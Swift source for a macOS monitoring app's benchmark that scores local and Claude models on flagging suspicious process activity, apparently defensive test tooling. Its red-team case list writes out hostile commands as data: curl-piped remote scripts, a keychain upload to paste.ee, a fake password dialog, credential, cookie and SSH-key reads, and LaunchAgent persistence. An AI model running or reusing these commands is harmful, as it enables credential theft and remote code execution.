import Foundation

// `Hostwatch --triage-benchmark`: local models against your own decisions. The same instructions and the same
// per-pattern prompt the app's on-device triage uses, sent to Apple's model and to models served by Ollama on
// localhost (nothing leaves the Mac). What matters most is "false Safe": a model settling as Safe something you
// marked Suspicious or Dangerous, the one mistake the triage router would act on.
// BENCH_N (per class, default 30), BENCH_MODELS ("apple,<ollama model>,…"), BENCH_OUT (details file).

struct BenchCase: Sendable {
    var key: String
    var truth: SignatureStatus           // safe, or suspicious/dangerous (both "flagged")
    var risk: PatternRisk
    var prompt: String
    var label: String
    var warned = false                   // Hostwatch found a warning sign: the router never takes a local Safe
}

private struct BenchAnswer: Sendable {
    var verdict: Verdict?
    var confidence: LocalVerdict.Confidence = .low
    var reason = ""
    var seconds: Double = 0
    var error: String?
}

func runTriageBenchmark() -> Never {
    setvbuf(stdout, nil, _IOLBF, 0)                  // a line at a time: the run is long and goes to a file
    let env = ProcessInfo.processInfo.environment
    let perClass = Int(env["BENCH_N"] ?? "") ?? 30
    let models = (env["BENCH_MODELS"] ?? "apple").split(separator: ",").map { $0.trimmingCharacters(in: .whitespaces) }
    guard let saved = SignatureStore.readSaved(from: AppPaths.support) else { print("no saved patterns"); exit(1) }
    SigningCache.shared.live = false
    SigningCache.shared.trustInstalledAppsInMemory()

    // Your own decisions only: the strongest answer key there is.
    let yours = saved.entries.filter(Decision.isYours)
    var safe = yours.filter { $0.status == .safe }
    var flagged = yours.filter { $0.status == .suspicious || $0.status == .dangerous }
    var rng = SeededGenerator(seed: 42)
    safe.shuffle(using: &rng); flagged.shuffle(using: &rng)
    // You rarely mark things Suspicious or Dangerous: Claude's flags (and high-risk patterns it reviewed) fill in, so
    // the one mistake that matters, a false Safe, is tested at all.
    if flagged.count < perClass {
        var more = saved.entries.filter { $0.source == "claude" && ($0.status == .suspicious || $0.status == .dangerous) }
        more.shuffle(using: &rng)
        flagged += more.prefix(perClass - flagged.count)
    }
    var red: [BenchCase] = []
    if flagged.count < perClass {
        // Nothing (or too little) was ever flagged here: attack-shaped patterns in the triage prompt's exact form,
        // all at "normal" risk so the model can't lean on the heuristic. Each is Dangerous by construction.
        red = Array(BenchRedTeam.cases.prefix(perClass - flagged.count))
    }
    let picked = Array(safe.prefix(perClass)) + Array(flagged.prefix(perClass))
    let cases = picked.map { e -> BenchCase in
        // No app here, so no recorded launches: the benchmark measures the prompt and the model, not the context.
        BenchCase(key: e.id, truth: e.status, risk: e.risk, prompt: TriagePrompt.pattern(e, context: nil),
                  label: "\(displayProcessName(e.process)) → \(e.pattern)",
                  warned: !TriagePrompt.warningSigns(e, context: nil).isEmpty)
    } + red
    let sources = Dictionary(grouping: saved.entries, by: { "\($0.source ?? "none")/\($0.status.rawValue)" }).mapValues(\.count)
    print("decisions by who and what: " + sources.sorted { $0.key < $1.key }.map { "\($0.key) \($0.value)" }.joined(separator: ", "))
    print("\(yours.count) of your decisions: \(safe.count) Safe. Flagged cases (yours, then Claude's): \(flagged.count), attack-shaped: \(red.count)")
    print("benchmark: \(cases.filter { $0.truth == .safe }.count) Safe + \(cases.filter { $0.truth != .safe }.count) flagged, models: \(models.joined(separator: ", "))\n")

    var details = ""
    let done = DispatchSemaphore(value: 0)
    Task.detached {
        for model in models {
            var answers: [BenchAnswer] = []
            let claude = model == "claude" || model.hasPrefix("claude:")
            if claude {
                // As the app asks Claude: every pattern in one batch, the shared prompt, its Safe taken as given.
                answers = askClaudeBatch(model == "claude" ? nil : String(model.dropFirst(7)), cases)
            } else {
                for (i, c) in cases.enumerated() {
                    let a = model == "apple" ? await askApple(c.prompt) : await askOllama(model, c.prompt)
                    answers.append(a)
                    FileHandle.standardError.write(Data("\r\(model): \(i + 1)/\(cases.count)   ".utf8))
                }
                FileHandle.standardError.write(Data("\n".utf8))
            }
            let (summary, lines) = score(model, cases, answers, local: !claude)
            print(summary)
            details += "## \(model)\n" + lines + "\n"
        }
        done.signal()
    }
    done.wait()
    let out = env["BENCH_OUT"] ?? NSTemporaryDirectory() + "triage-benchmark.txt"
    try? details.write(toFile: out, atomically: true, encoding: .utf8)
    print("\ndetails (each disagreement): \(out)")
    exit(0)
}

/// - local: a local model, whose Safe the router drops when Hostwatch found a warning sign. Claude's Safe is taken as
///   given (the app's guardrails for high-risk patterns and shells apply to both and aren't counted here).
private func score(_ model: String, _ cases: [BenchCase], _ answers: [BenchAnswer], local: Bool) -> (String, String) {
    var modelFalseSafe = 0
    var falseSafe = 0, settledSafe = 0, flaggedCaught = 0, safeAgreed = 0, unsure = 0, errors = 0
    var times: [Double] = []
    var lines = ""
    for (c, a) in zip(cases, answers) {
        guard a.error == nil, let v = a.verdict else {
            errors += 1
            lines += "ERROR  \(c.label)  \(a.error ?? "")\n"
            continue
        }
        times.append(a.seconds)
        // What the router would do with it: only a confident Safe on a pattern that isn't high-risk is settled.
        let modelSettles = v == .safe && a.confidence == .high && c.risk != .high
        let settles = modelSettles && !(local && c.warned)
        if modelSettles, c.truth != .safe { modelFalseSafe += 1 }
        let saysFlag = v == .suspicious || v == .dangerous
        if v == .unknown { unsure += 1 }
        if c.truth == .safe {
            if v == .safe { safeAgreed += 1 }
            if settles { settledSafe += 1 }
            if saysFlag { lines += "FLAGGED a Safe one  \(c.label)  — \(a.reason)\n" }
        } else {
            if saysFlag { flaggedCaught += 1 }
            if settles { falseSafe += 1; lines += "FALSE SAFE  \(c.label)  — \(a.reason)\n" }
            else if v == .safe { lines += "said safe (not settled)  \(c.label)  — \(a.reason)\n" }
        }
    }
    let nSafe = cases.filter { $0.truth == .safe }.count, nFlag = cases.count - nSafe
    times.sort()
    let avg = times.isEmpty ? 0 : times.reduce(0, +) / Double(times.count)
    let p90 = times.isEmpty ? 0 : times[min(times.count - 1, Int(Double(times.count) * 0.9))]
    func pct(_ a: Int, _ b: Int) -> String { b == 0 ? "–" : "\(Int((Double(a) / Double(b) * 100).rounded()))%" }
    let summary = """
    \(model)
      false Safe (settled one you flagged): \(falseSafe) of \(nFlag)\(local ? "   (the model alone: \(modelFalseSafe), warning signs stop the rest)" : "")
      your Safe ones it would settle:       \(settledSafe) of \(nSafe) (\(pct(settledSafe, nSafe)))
      agrees Safe:                          \(pct(safeAgreed, nSafe))   flags your flagged ones: \(pct(flaggedCaught, nFlag))
      unsure: \(unsure)   errors or refusals: \(errors)
      time per pattern: \(String(format: "%.2f", avg)) s average, \(String(format: "%.2f", p90)) s at the 90th percentile
    """
    return (summary, lines)
}

/// One Claude Code call for the whole sample, in a fixed shuffled order (Safe ones and attacks mixed, as in real
/// batches). Each pattern's time is the call's time shared out.
private func askClaudeBatch(_ alias: String?, _ cases: [BenchCase]) -> [BenchAnswer] {
    guard let claude = ClaudeLocator.path else { return cases.map { _ in BenchAnswer(error: "Claude Code CLI not found") } }
    var order = Array(cases.indices)
    var rng = SeededGenerator(seed: 7)
    order.shuffle(using: &rng)
    let prompt = (["Classify these \(cases.count) patterns:"] + order.enumerated().map { "\($0.offset + 1).\n" + cases[$0.element].prompt })
        .joined(separator: "\n\n")
    let p = Process()
    p.executableURL = URL(fileURLWithPath: claude)
    p.arguments = ["-p", "--output-format", "json", "--no-session-persistence", "--setting-sources", "", "--strict-mcp-config",
                   "--tools", "", "--system-prompt", PatternClassifier.systemPrompt] + (alias.map { ["--model", $0] } ?? [])
    p.environment = ClaudeLocator.environment
    let input = Pipe(), output = Pipe()
    p.standardInput = input
    p.standardOutput = output
    p.standardError = FileHandle.nullDevice
    let start = Date()
    do { try p.run() } catch { return cases.map { _ in BenchAnswer(error: "\(error)") } }
    input.fileHandleForWriting.write(Data(Secrets.mask(prompt).utf8))
    try? input.fileHandleForWriting.close()
    let out = output.fileHandleForReading.readDataToEndOfFile()
    p.waitUntilExit()
    let each = Date().timeIntervalSince(start) / Double(max(cases.count, 1))
    guard let obj = (try? JSONSerialization.jsonObject(with: out)) as? [String: Any], let text = obj["result"] as? String,
          let open = text.firstIndex(of: "["), let close = text.lastIndex(of: "]"),
          let items = (try? JSONSerialization.jsonObject(with: Data(text[open...close].utf8))) as? [[String: Any]]
    else {
        try? out.write(to: URL(fileURLWithPath: NSTemporaryDirectory() + "triage-benchmark-claude-raw.json"))
        return cases.map { _ in BenchAnswer(seconds: each, error: "Claude's answer couldn't be read") }
    }
    if let cost = obj["total_cost_usd"] as? Double { print(String(format: "  (Claude call: $%.3f)", cost)) }
    var answers = cases.map { _ in BenchAnswer(seconds: each, error: "no answer for it") }
    for item in items {
        guard let n = (item["id"] as? NSNumber)?.intValue, n >= 1, n <= order.count,
              let word = (item["verdict"] as? String)?.uppercased() else { continue }
        // Claude answers without a confidence: its verdict is applied as it stands, so it counts as confident.
        answers[order[n - 1]] = BenchAnswer(verdict: Verdict(rawValue: word) ?? .unknown, confidence: .high,
                                            reason: item["reason"] as? String ?? "", seconds: each)
    }
    return answers
}

private func askApple(_ prompt: String) async -> BenchAnswer {
    let start = Date()
    do {
        let v = try await AppleOnDeviceModel().triage(prompt)
        return BenchAnswer(verdict: v.verdict, confidence: v.confidence, reason: v.reason, seconds: Date().timeIntervalSince(start))
    } catch {
        return BenchAnswer(seconds: Date().timeIntervalSince(start), error: AppleOnDeviceModel.isRefusal(error) ? "refused" : "\(error)")
    }
}

/// Ollama's chat API on localhost. Reasoning models think first, so the answer is the last JSON object in the reply.
private func askOllama(_ model: String, _ prompt: String) async -> BenchAnswer {
    let start = Date()
    let system = AppleOnDeviceModel.instructions + "\n\nAnswer with one JSON object only: "
        + #"{"verdict": "SAFE" | "SUSPICIOUS" | "DANGEROUS" | "UNSURE", "confidence": "low" | "medium" | "high", "reason": "at most 15 words"}"#
    let body: [String: Any] = ["model": model, "stream": false, "options": ["temperature": 0, "num_ctx": 4096],
                               "messages": [["role": "system", "content": system],
                                            ["role": "user", "content": Secrets.mask(prompt)]]]
    var request = URLRequest(url: URL(string: "http://127.0.0.1:11434/api/chat")!)
    request.httpMethod = "POST"
    request.timeoutInterval = 300
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
    request.httpBody = try? JSONSerialization.data(withJSONObject: body)
    do {
        let (data, _) = try await URLSession.shared.data(for: request)
        let seconds = Date().timeIntervalSince(start)
        guard let obj = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any],
              let content = (obj["message"] as? [String: Any])?["content"] as? String
        else { return BenchAnswer(seconds: seconds, error: String(decoding: data.prefix(200), as: UTF8.self)) }
        let text = content.components(separatedBy: "</think>").last ?? content
        guard let open = text.range(of: "{", options: .backwards), let close = text.range(of: "}", options: .backwards),
              open.lowerBound < close.upperBound,
              let json = (try? JSONSerialization.jsonObject(with: Data(text[open.lowerBound..<close.upperBound].utf8))) as? [String: Any]
        else { return BenchAnswer(seconds: seconds, error: "no JSON: " + String(text.suffix(120))) }
        let word = (json["verdict"] as? String ?? "").uppercased()
        return BenchAnswer(verdict: Verdict(rawValue: word == "UNSURE" ? "UNKNOWN" : word) ?? .unknown,
                           confidence: LocalVerdict.Confidence(rawValue: (json["confidence"] as? String ?? "").lowercased()) ?? .low,
                           reason: json["reason"] as? String ?? "", seconds: seconds)
    } catch {
        return BenchAnswer(seconds: Date().timeIntervalSince(start), error: "\(error.localizedDescription)")
    }
}

/// A repeatable shuffle: the same sample on every run, so models are compared on the same patterns.
struct SeededGenerator: RandomNumberGenerator {
    private var state: UInt64
    init(seed: UInt64) { state = seed &+ 0x9E37_79B9_7F4A_7C15 }
    mutating func next() -> UInt64 {
        state &+= 0x9E37_79B9_7F4A_7C15
        var z = state
        z = (z ^ (z >> 30)) &* 0xBF58_476D_1CE4_E5B9
        z = (z ^ (z >> 27)) &* 0x94D0_49BB_1331_11EB
        return z ^ (z >> 31)
    }
}

/// Attack-shaped patterns for when nothing on this Mac was ever flagged. Written the way the triage prompt describes
/// a real pattern; the risk line says "normal" on purpose (the heuristic missed it), which is exactly when the model's
/// answer matters.
enum BenchRedTeam {
    /// One attack as a real pattern entry with its context, so it goes through the very prompt builder real patterns do.
    static func make(_ kind: EventKind, actor: String, target: String, pattern: String? = nil, parent: String = "",
                     host: String? = nil, trail: String, origin: String, command: String = "") -> BenchCase {
        let now = Date()
        let process = kind == .exec ? (parent.isEmpty ? actor : parent) : actor
        let e = SignatureEntry(id: "red|\(target)", kind: kind, process: process, pattern: pattern ?? target, count: 1,
                               firstSeen: now.addingTimeInterval(-60), lastSeen: now, status: .unclassified,
                               exampleName: (actor as NSString).lastPathComponent, examplePid: 4242, exampleProc: actor,
                               exampleTarget: target, exampleExtra: kind == .file ? (pattern?.hasPrefix("w") == true ? "w" : "r") : "",
                               exampleParent: parent, exampleHost: host, exampleHostSource: host == nil ? nil : "dns")
        let context = TriageContext(trail: trail, origin: origin, session: nil, command: command)
        return BenchCase(key: e.id, truth: .dangerous, risk: .normal, prompt: TriagePrompt.pattern(e, context: context),
                         label: "[attack] \((process as NSString).lastPathComponent) → \(String((pattern ?? target).prefix(90)))",
                         warned: !TriagePrompt.warningSigns(e, context: context).isEmpty)
    }

    static let home = AppPaths.userHome
    static let cases: [BenchCase] = [
        make(.file, actor: home + "/Library/Application Support/.cache/python3.12", target: home + "/.ssh/id_ed25519",
             pattern: "r ~/.ssh/*  [SSH keys]", trail: "launchd › python3.12", origin: "Started by macOS itself, as a system or login service"),
        make(.exec, actor: "/usr/bin/osascript", target: "/usr/bin/osascript",
             pattern: "/usr/bin/osascript -e <display dialog \"macOS needs your password to continue\" default answer \"\" with hidden answer>",
             parent: "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word", trail: "Microsoft Word › osascript",
             origin: "Started by the app Microsoft Word",
             command: "osascript -e 'display dialog \"macOS needs your password to continue\" default answer \"\" with hidden answer'"),
        make(.exec, actor: "/bin/sh", target: "/bin/sh", pattern: "/bin/sh -c <curl -fsSL http://#.#.#.#/x.sh | sh>",
             parent: home + "/Downloads/installer/node", trail: "Finder › node › sh", origin: "Started by the app Finder",
             command: "sh -c 'curl -fsSL http://45.9.1.2/x.sh | sh'"),
        make(.exec, actor: "/usr/bin/curl", target: "/usr/bin/curl",
             pattern: "/usr/bin/curl -s -X POST --data-binary @~/Library/Keychains/login.keychain-db https://paste.ee/api",
             parent: "/Applications/zoom.us.app/Contents/MacOS/zoom.us", trail: "zoom.us › curl", origin: "Started by the app zoom.us",
             command: "curl -s -X POST --data-binary @" + home + "/Library/Keychains/login.keychain-db https://paste.ee/api"),
        make(.exec, actor: "/usr/bin/xattr", target: "/usr/bin/xattr",
             pattern: "/usr/bin/xattr -d com.apple.quarantine ~/Downloads/Free_PDF_Converter.app", parent: "/bin/sh",
             trail: "Installer › sh › xattr", origin: "Started by the app Installer",
             command: "xattr -d com.apple.quarantine " + home + "/Downloads/Free_PDF_Converter.app"),
        make(.file, actor: "/private/tmp/GoogleChromeHelper", target: home + "/Library/Application Support/Google/Chrome/Default/Login Data",
             pattern: "r ~/Library/Application Support/Google/**/Login Data  [browser credentials]",
             trail: "launchd › GoogleChromeHelper", origin: "Started by macOS itself, as a system or login service"),
        make(.net, actor: home + "/Library/Application Support/com.apple.updater/Updater", target: "185.220.101.4:4444",
             pattern: "TCP #.#.#.#:4444", trail: "launchd › Updater", origin: "Started by macOS itself, as a system or login service"),
        make(.file, actor: "/bin/bash", target: home + "/Library/LaunchAgents/com.apple.softwareupdated.plist",
             pattern: "w ~/Library/LaunchAgents/com.apple.softwareupdated.plist  [persistence]",
             trail: "Safari › bash", origin: "Started by the app Safari"),
        make(.exec, actor: "/bin/launchctl", target: "/bin/launchctl", pattern: "/bin/launchctl load ~/Library/LaunchAgents/com.svc.plist",
             parent: "/Users/Shared/.svc/agent", trail: "launchd › agent › launchctl", origin: "Started by macOS itself, as a system or login service",
             command: "launchctl load " + home + "/Library/LaunchAgents/com.svc.plist"),
        make(.exec, actor: "/usr/bin/sqlite3", target: "/usr/bin/sqlite3",
             pattern: "/usr/bin/sqlite3 ~/Library/Messages/chat.db <select text from message>", parent: "/usr/bin/osascript",
             trail: "Pages › osascript › sqlite3", origin: "Started by the app Pages",
             command: "sqlite3 " + home + "/Library/Messages/chat.db 'select text from message'"),
        make(.exec, actor: "/usr/bin/security", target: "/usr/bin/security",
             pattern: "/usr/bin/security find-generic-password -wa <Chrome Safe Storage>", parent: "/usr/local/bin/python3",
             trail: "launchd › python3 › security", origin: "Started by macOS itself, as a system or login service",
             command: "security find-generic-password -wa 'Chrome Safe Storage'"),
        make(.exec, actor: "/usr/sbin/screencapture", target: "/usr/sbin/screencapture", pattern: "/usr/sbin/screencapture -x /tmp/.s.png",
             parent: "/private/tmp/.x/helper", trail: "launchd › helper › screencapture", origin: "Started by macOS itself, as a system or login service",
             command: "screencapture -x /tmp/.s.png"),
        make(.exec, actor: "/bin/sh", target: "/bin/sh", pattern: "/bin/sh -c <echo <base64> | base64 -d | sh>", parent: "/bin/sh",
             trail: "Slack › sh › sh", origin: "Started by the app Slack", command: "sh -c 'echo ZWNobyBoaQ== | base64 -d | sh'"),
        make(.net, actor: home + "/Downloads/ncat", target: "45.9.1.2:9001", pattern: "TCP #.#.#.#:9001",
             trail: "Terminal › zsh › ncat", origin: "Started from Terminal, a terminal"),
        make(.exec, actor: "/usr/bin/zip", target: "/usr/bin/zip", pattern: "/usr/bin/zip -qr /tmp/.d.zip ~/Documents ~/.aws ~/.kube",
             parent: "/usr/local/bin/python3", trail: "launchd › python3 › zip", origin: "Started by macOS itself, as a system or login service",
             command: "zip -qr /tmp/.d.zip " + home + "/Documents " + home + "/.aws " + home + "/.kube"),
        make(.file, actor: home + "/Library/.helper", target: home + "/Library/Cookies/Cookies.binarycookies",
             pattern: "r ~/Library/Cookies/*  [cookies]", trail: "launchd › .helper", origin: "Started by macOS itself, as a system or login service"),
        make(.exec, actor: "/usr/bin/crontab", target: "/usr/bin/crontab", pattern: "/usr/bin/crontab /private/var/tmp/.c",
             parent: "/private/var/tmp/sync", trail: "launchd › sync › crontab", origin: "Started by macOS itself, as a system or login service",
             command: "crontab /private/var/tmp/.c"),
        make(.file, actor: home + "/Downloads/tccfix", target: home + "/Library/Application Support/com.apple.TCC/TCC.db",
             pattern: "w ~/Library/Application Support/com.apple.TCC/TCC.db  [TCC database]", trail: "Finder › tccfix",
             origin: "Started by the app Finder"),
        make(.exec, actor: "/bin/zsh", target: "/bin/zsh", pattern: "/bin/zsh -c <curl -s https://#.#.#.#/p | python3 ->",
             parent: "/Applications/PDFReader.app/Contents/MacOS/PDFReader", trail: "PDFReader › zsh", origin: "Started by the app PDFReader",
             command: "zsh -c 'curl -s https://45.9.1.2/p | python3 -'"),
        make(.file, actor: "/Applications/Discord.app/Contents/Frameworks/Discord Helper.app/Contents/MacOS/Discord Helper",
             target: home + "/.aws/credentials", pattern: "r ~/.aws/*  [cloud credentials]", trail: "Discord › Discord Helper",
             origin: "Started by the app Discord"),
    ]
}
